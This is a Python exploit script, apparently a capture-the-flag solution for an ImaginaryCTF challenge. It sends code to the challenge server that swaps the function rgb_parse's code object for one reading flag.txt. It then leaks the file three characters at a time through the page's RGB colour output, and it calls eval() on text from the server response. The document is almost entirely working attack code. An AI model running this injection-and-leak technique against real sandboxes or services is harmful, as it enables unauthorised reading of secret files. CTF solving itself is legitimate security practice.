import requests

baseURL = 'http://p2c.chal.imaginaryctf.org/'
# baseURL = "http://localhost:3000"
def pythonCode(code):
    url = baseURL
    sendData = {"code": code}
    r = requests.post(url, data=sendData)
    return r

flag = ""
for i in range(0, 60, 3):

    exploit = f"""
from parse import rgb_parse
def new(text):
    with open("flag.txt", "r") as f:
        flag = f.read()
        return ord(flag[{i}]), ord(flag[{i+1}]), ord(flag[{i+2}])
rgb_parse.__code__ = new.__code__
return "code"
"""
    res = pythonCode(exploit).text
    res = res.split('changeBackgroundColor("rgb')
    res = res[1]
    res = res.split('");')
    res = eval(res[0])
    flag += chr(res[0]) + chr(res[1]) + chr(res[2])
    print(flag)

print(flag)
